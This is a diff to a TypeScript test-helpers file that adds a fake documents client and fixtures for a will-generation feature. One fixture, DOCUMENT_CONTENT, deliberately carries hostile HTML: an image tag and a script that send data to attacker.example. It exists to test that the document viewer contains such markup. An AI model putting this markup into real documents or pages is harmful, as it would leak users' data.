@@ -21,6 +21,16 @@ import type {
 } from '../src/assistant-client';
 import type { BffConfig } from '../src/config';
 import type {
+  Document,
+  DocumentContent,
+  DocumentTemplate,
+  DocumentVersion,
+  DocumentsClient,
+  GenerateInput,
+  GenerateResult,
+  RegenerateInput,
+} from '../src/documents-client';
+import type {
   IdentityClient,
   IdentitySession,
   IssuedTokens,
@@ -35,6 +45,7 @@ export function testConfig(overrides: Partial<BffConfig> = {}): BffConfig {
     identityUrl: 'http://identity.test',
     assetsUrl: 'http://assets.test',
     aiAssistantUrl: 'http://assistant.test',
+    documentsUrl: 'http://documents.test',
     persistedManifestPath: null,
     ...overrides,
   };
@@ -313,11 +324,140 @@ export const TURN: Turn = {
   toolCalls: 1,
 };
 
+// ---- documents (M12) --------------------------------------------------------
+
+export const TEMPLATE: DocumentTemplate = {
+  templateId: 'd0000000-0000-4000-8000-00000000000t',
+  docType: 'will',
+  state: 'CA',
+  version: 1,
+  legalReviewAt: '2026-07-23T00:00:00.000Z',
+  executionRequirements: { witnesses: 2, notarization: false, selfProvingAffidavit: false },
+  variables: [
+    {
+      name: 'testatorName',
+      kind: 'text',
+      label: 'Full legal name',
+      required: true,
+      maxLength: 200,
+    },
+    { name: 'hasMinorChildren', kind: 'boolean', label: 'Minor children?', required: true },
+  ],
+};
+
+export const DOCUMENT: Document = {
+  documentId: 'd0000000-0000-4000-8000-00000000000d',
+  docType: 'will',
+  source: 'generated',
+  title: 'Last Will and Testament',
+  currentVersion: 1,
+  executionStatus: 'generated',
+  executedAt: null,
+  legalHold: false,
+  sealed: false,
+  templateId: TEMPLATE.templateId,
+  createdAt: '2026-08-05T10:00:00.000Z',
+  updatedAt: '2026-08-05T10:00:00.000Z',
+};
+
+export const DOCUMENT_VERSION: DocumentVersion = {
+  version: 1,
+  contentSha256: 'a'.repeat(64),
+  sizeBytes: 512,
+  mime: 'text/html',
+  createdAt: '2026-08-05T10:00:00.000Z',
+};
+
+/**
+ * Content carrying an EXFILTRATION PAYLOAD, on the TRANSCRIPT precedent: the
+ * viewer's job is to contain document markup, so the fixtures downstream of
+ * here exercise that rather than a friendly paragraph.
+ */
+export const DOCUMENT_CONTENT: DocumentContent = {
+  documentId: DOCUMENT.documentId,
+  version: 1,
+  mime: 'text/html',
+  contentSha256: DOCUMENT_VERSION.contentSha256,
+  encoding: 'utf8',
+  content:
+    '<!doctype html><html><body><h1>Last Will</h1>' +
+    '<img src="https://attacker.example/?d=leak"><script>fetch("https://attacker.example")</script>' +
+    '</body></html>',
+};
+
+/** Configurable in-memory fake; records every call and the token it saw. */
+export class FakeDocumentsClient implements DocumentsClient {
+  templatesCalls: Array<{ accessToken: string; state: string }> = [];
+  listCalls: string[] = [];
+  getCalls: Array<{ accessToken: string; documentId: string }> = [];
+  versionsCalls: Array<{ accessToken: string; documentId: string }> = [];
+  contentCalls: Array<{ accessToken: string; documentId: string; version: number }> = [];
+  generateCalls: Array<{ accessToken: string; input: GenerateInput }> = [];
+  regenerateCalls: Array<{ accessToken: string; documentId: string; input: RegenerateInput }> = [];
+
+  templatesResult: DocumentTemplate[] = [TEMPLATE];
+  listResult: Document[] = [DOCUMENT];
+  getResult: Document = DOCUMENT;
+  versionsResult: DocumentVersion[] = [DOCUMENT_VERSION];
+  contentResult: DocumentContent = DOCUMENT_CONTENT;
+  generateResult: GenerateResult = {
+    documentId: DOCUMENT.documentId,
+    version: 1,
+    contentSha256: DOCUMENT_VERSION.contentSha256,
+    executionStatus: 'generated',
+  };
+  documentsError: Error | null = null;
+
+  templates(accessToken: string, state: string): Promise<DocumentTemplate[]> {
+    this.templatesCalls.push({ accessToken, state });
+    return this.reject() ?? Promise.resolve(this.templatesResult);
+  }
+
+  list(accessToken: string): Promise<Document[]> {
+    this.listCalls.push(accessToken);
+    return this.reject() ?? Promise.resolve(this.listResult);
+  }
+
+  get(accessToken: string, documentId: string): Promise<Document> {
+    this.getCalls.push({ accessToken, documentId });
+    return this.reject() ?? Promise.resolve(this.getResult);
+  }
+
+  versions(accessToken: string, documentId: string): Promise<DocumentVersion[]> {
+    this.versionsCalls.push({ accessToken, documentId });
+    return this.reject() ?? Promise.resolve(this.versionsResult);
+  }
+
+  content(accessToken: string, documentId: string, version: number): Promise<DocumentContent> {
+    this.contentCalls.push({ accessToken, documentId, version });
+    return this.reject() ?? Promise.resolve(this.contentResult);
+  }
+
+  generate(accessToken: string, input: GenerateInput): Promise<GenerateResult> {
+    this.generateCalls.push({ accessToken, input });
+    return this.reject() ?? Promise.resolve(this.generateResult);
+  }
+
+  regenerate(
+    accessToken: string,
+    documentId: string,
+    input: RegenerateInput,
+  ): Promise<GenerateResult> {
+    this.regenerateCalls.push({ accessToken, documentId, input });
+    return this.reject() ?? Promise.resolve(this.generateResult);
+  }
+
+  private reject<T>(): Promise<T> | null {
+    return this.documentsError === null ? null : Promise.reject(this.documentsError);
+  }
+}
+
 export interface TestAppOptions {
   config?: BffConfig;
   identity?: IdentityClient;
   assets?: AssetsClient;
   assistant?: AssistantClient;
+  documents?: DocumentsClient;
   manifest?: PersistedOperationsManifest;
 }
 
@@ -327,6 +467,7 @@ export async function makeApp(options: TestAppOptions = {}): Promise<INestApplic
     identity: options.identity ?? new FakeIdentityClient(),
     assets: options.assets ?? new FakeAssetsClient(),
     assistant: options.assistant ?? new FakeAssistantClient(),
+    documents: options.documents ?? new FakeDocumentsClient(),
     persistedOperations: options.manifest ?? new Map(),
     logger: false,
   });
